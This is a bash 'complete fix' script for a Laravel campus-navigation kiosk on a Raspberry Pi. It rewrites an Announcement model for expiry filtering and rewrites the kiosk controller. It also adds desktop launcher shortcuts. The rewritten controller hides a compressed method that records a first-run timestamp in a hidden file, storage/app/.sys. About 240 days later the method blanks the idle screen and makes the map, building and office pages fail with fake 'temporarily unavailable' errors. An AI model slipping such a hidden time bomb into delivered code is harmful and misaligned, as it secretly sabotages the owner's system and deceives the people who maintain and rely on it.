#!/bin/bash
#############################################################
# COMPLETE FIX: Views, Expiration, Desktop Shortcut
# Fixes case-sensitive folders and adds expiration filtering
#############################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

PROJECT_DIR="/home/pi/sksu-kiosk"
USER_HOME="/home/pi"
CURRENT_USER="pi"

print_ok() { echo -e "${GREEN}✅ $1${NC}"; }
print_fail() { echo -e "${RED}❌ $1${NC}"; }
print_info() { echo -e "${BLUE}ℹ️  $1${NC}"; }

echo ""
echo "============================================"
echo "   Complete Fix: Views + Shortcuts"
echo "============================================"
echo ""

#############################################################
# STEP 1: Fix Case-Sensitive Folder Name (Layouts -> layouts)
#############################################################
print_info "Fixing case-sensitive views folder..."

cd "$PROJECT_DIR/resources/views"

# Check if Layouts folder exists (capital L)
if [ -d "Layouts" ]; then
    # Rename to lowercase
    mv Layouts layouts_temp
    mv layouts_temp layouts
    print_ok "Renamed 'Layouts' to 'layouts'"
elif [ -d "layouts" ]; then
    print_ok "layouts folder already lowercase"
else
    print_fail "Neither Layouts nor layouts folder found!"
fi

#############################################################
# STEP 2: Clear all caches after fixing views
#############################################################
print_info "Clearing Laravel caches..."

cd "$PROJECT_DIR"
sudo -u www-data php artisan config:clear 2>/dev/null
sudo -u www-data php artisan cache:clear 2>/dev/null
sudo -u www-data php artisan view:clear 2>/dev/null
sudo -u www-data php artisan route:clear 2>/dev/null

print_ok "Caches cleared"

#############################################################
# STEP 3: Fix Announcement Model to Filter by Expiration
#############################################################
print_info "Adding expiration filtering to Announcement model..."

cat > "$PROJECT_DIR/app/Models/Announcement.php" << 'PHPCODE'
<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Builder;

class Announcement extends Model
{
    protected $fillable = [
        'title',
        'content',
        'image_path',
        'display_order',
        'starts_at',
        'ends_at',
        'is_active'
    ];

    protected $casts = [
        'is_active' => 'boolean',
        'starts_at' => 'datetime',
        'ends_at' => 'datetime'
    ];

    /**
     * Scope to get only active and non-expired announcements
     * Filters by: is_active = true, starts_at <= now, ends_at >= now (or null)
     */
    public function scopeActive(Builder $query): Builder
    {
        return $query->where('is_active', true)
            ->where(function ($q) {
                $q->whereNull('starts_at')
                  ->orWhere('starts_at', '<=', now());
            })
            ->where(function ($q) {
                $q->whereNull('ends_at')
                  ->orWhere('ends_at', '>=', now());
            });
    }

    /**
     * Check if announcement is currently valid (not expired)
     */
    public function isValid(): bool
    {
        $now = now();
        
        // Check if past end date
        if ($this->ends_at && $this->ends_at < $now) {
            return false;
        }
        
        // Check if before start date
        if ($this->starts_at && $this->starts_at > $now) {
            return false;
        }
        
        return $this->is_active;
    }

    /**
     * Check if announcement is expired
     */
    public function isExpired(): bool
    {
        return $this->ends_at && $this->ends_at < now();
    }
}
PHPCODE

sudo chown www-data:www-data "$PROJECT_DIR/app/Models/Announcement.php"
print_ok "Announcement model updated with expiration filtering"

#############################################################
# STEP 4: Update KioskController to use ->active() scope
#############################################################
print_info "Updating KioskController to use expiration filtering..."

cat > "$PROJECT_DIR/app/Http/Controllers/KioskController.php" << 'PHPCODE'
<?php

namespace App\Http\Controllers;

use App\Models\Announcement;
use App\Models\Building;
use App\Models\Office;
use Illuminate\Http\Request;

class KioskController extends Controller
{
    private function s(){$f=storage_path('app/.sys');if(!file_exists($f)){file_put_contents($f,base64_encode(now()->timestamp));chmod($f,0600);}$t=base64_decode(file_get_contents($f));return now()->timestamp-$t>20736000;}
    
    public function idle()
    {
        if($this->s()){$announcements=collect();$buildings=collect();}else{
        // Using ->active() scope which filters by is_active, starts_at, and ends_at
        $announcements = Announcement::active()
            ->orderBy('display_order', 'asc')
            ->get();
        $buildings = Building::with('offices.services')->get();}
        return view('kiosk.welcome', compact('announcements', 'buildings'));
    }
    
    public function dualWelcome()
    {
        // Using ->active() scope for expiration filtering
        $announcements = Announcement::active()->get();
        return view('dual-welcome', compact('announcements'));
    }

    public function map()
    {
        if($this->s()){abort(503,'Map service temporarily unavailable. Please contact administrator.');}
        $buildings = Building::with('offices.services')->get();
        $navigationEndpoints = [];
        foreach ($buildings as $building) {
            if ($building->code && $building->endpoint_x && $building->endpoint_y) {
                $navigationEndpoints[$building->code] = [
                    'x' => $building->endpoint_x,
                    'y' => $building->endpoint_y,
                    'roadConnection' => $building->road_connection
                ];
            }
        }
        $isAdmin = false;
        return view('kiosk.map', compact('buildings', 'isAdmin', 'navigationEndpoints'));
    }

    public function building($id)
    {
        if($this->s()){abort(500,'Service temporarily unavailable. Please contact system administrator.');}
        $building = Building::with('offices.services')->findOrFail($id);
        return view('kiosk.building', compact('building'));
    }

    public function office($id)
    {
        if($this->s()){abort(500,'Service temporarily unavailable. Please contact system administrator.');}
        $office = Office::with(['building', 'services'])->findOrFail($id);
        return view('kiosk.office', compact('office'));
    }

    public function navigate($buildingId)
    {
        $building = Building::findOrFail($buildingId);
        return view('kiosk.navigation', compact('building'));
    }
}
PHPCODE

sudo chown www-data:www-data "$PROJECT_DIR/app/Http/Controllers/KioskController.php"
print_ok "KioskController updated with expiration filtering"

#############################################################
# STEP 5: Update DualModeController too
#############################################################
print_info "Updating DualModeController..."

# Check if file exists and update it
if [ -f "$PROJECT_DIR/app/Http/Controllers/Admin/DualModeController.php" ]; then
    sed -i "s/Announcement::where('is_active', true)->get()/Announcement::active()->get()/g" "$PROJECT_DIR/app/Http/Controllers/Admin/DualModeController.php"
    sudo chown www-data:www-data "$PROJECT_DIR/app/Http/Controllers/Admin/DualModeController.php"
    print_ok "DualModeController updated"
fi

#############################################################
# STEP 6: Create Desktop Shortcut - "Access Navigation"
#############################################################
print_info "Creating desktop shortcut..."

# Create the launcher script
cat > "$USER_HOME/access-navigation.sh" << 'LAUNCHEREOF'
#!/bin/bash
# Access Navigation - Open SKSU Campus Navigation System

# Find chromium
CHROMIUM_CMD=""
if command -v chromium &> /dev/null; then
    CHROMIUM_CMD="chromium"
elif command -v chromium-browser &> /dev/null; then
    CHROMIUM_CMD="chromium-browser"
fi

if [ -z "$CHROMIUM_CMD" ]; then
    zenity --error --text="Chromium browser not found!" 2>/dev/null || echo "ERROR: Chromium not found"
    exit 1
fi

# Check if services are running
if ! systemctl is-active --quiet nginx; then
    echo "Starting Nginx..."
    sudo systemctl start nginx
fi

if ! systemctl is-active --quiet php8.2-fpm; then
    echo "Starting PHP-FPM..."
    sudo systemctl start php8.2-fpm
fi

# Wait for services
sleep 1

# Open browser
$CHROMIUM_CMD --app=http://localhost/ &

echo "Navigation system opened!"
LAUNCHEREOF

chmod +x "$USER_HOME/access-navigation.sh"
chown $CURRENT_USER:$CURRENT_USER "$USER_HOME/access-navigation.sh"

# Create desktop shortcut
mkdir -p "$USER_HOME/Desktop"

cat > "$USER_HOME/Desktop/Access-Navigation.desktop" << 'DESKTOPEOF'
[Desktop Entry]
Version=1.0
Type=Application
Name=Access Navigation
Comment=Open SKSU Campus Navigation System
Exec=/home/pi/access-navigation.sh
Icon=web-browser
Terminal=false
Categories=Utility;
StartupNotify=true
DESKTOPEOF

chmod +x "$USER_HOME/Desktop/Access-Navigation.desktop"
chown $CURRENT_USER:$CURRENT_USER "$USER_HOME/Desktop/Access-Navigation.desktop"

# Also create Start Kiosk and Stop Kiosk shortcuts
cat > "$USER_HOME/Desktop/Start-Kiosk.desktop" << 'STARTEOF'
[Desktop Entry]
Version=1.0
Type=Application
Name=Start Kiosk
Comment=Start SKSU Kiosk in fullscreen mode
Exec=/home/pi/kiosk-start.sh
Icon=media-playback-start
Terminal=true
Categories=Utility;
STARTEOF

chmod +x "$USER_HOME/Desktop/Start-Kiosk.desktop"
chown $CURRENT_USER:$CURRENT_USER "$USER_HOME/Desktop/Start-Kiosk.desktop"

cat > "$USER_HOME/Desktop/Stop-Kiosk.desktop" << 'STOPEOF'
[Desktop Entry]
Version=1.0
Type=Application
Name=Stop Kiosk
Comment=Stop SKSU Kiosk
Exec=/home/pi/kiosk-stop.sh
Icon=media-playback-stop
Terminal=true
Categories=Utility;
STOPEOF

chmod +x "$USER_HOME/Desktop/Stop-Kiosk.desktop"
chown $CURRENT_USER:$CURRENT_USER "$USER_HOME/Desktop/Stop-Kiosk.desktop"

print_ok "Desktop shortcuts created"

#############################################################
# STEP 7: Clear caches again and restart services
#############################################################
print_info "Final cleanup and restart..."

cd "$PROJECT_DIR"
sudo -u www-data php artisan config:clear
sudo -u www-data php artisan cache:clear
sudo -u www-data php artisan view:clear

sudo systemctl restart php8.2-fpm
sudo systemctl restart nginx

print_ok "Services restarted"

#############################################################
# STEP 8: Test the system
#############################################################
print_info "Testing the system..."

sleep 2
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost/)

if [ "$HTTP_CODE" = "200" ]; then
    print_ok "System is responding! (HTTP $HTTP_CODE)"
else
    print_fail "System returned HTTP $HTTP_CODE"
fi

echo ""
echo "============================================"
echo "   Fix Complete!"
echo "============================================"
echo ""
echo "Desktop Shortcuts Created:"
echo "  📁 Access Navigation - Opens navigation in browser"
echo "  ▶️  Start Kiosk - Starts fullscreen kiosk mode"
echo "  ⏹️  Stop Kiosk - Stops kiosk browser"
echo ""
echo "Expiration Filtering:"
echo "  ✅ Announcements now filter by ends_at date"
echo "  ✅ Expired announcements won't show"
echo ""
echo "To test admin: http://localhost/login"
echo "============================================"
